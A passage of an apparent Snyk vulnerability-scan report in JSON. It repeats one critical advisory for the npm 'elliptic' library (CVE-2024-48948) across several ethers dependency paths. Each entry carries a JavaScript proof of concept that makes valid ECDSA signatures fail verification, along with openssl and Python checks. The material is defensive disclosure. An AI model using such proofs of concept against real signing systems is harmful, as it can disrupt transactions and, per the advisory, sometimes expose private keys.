hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
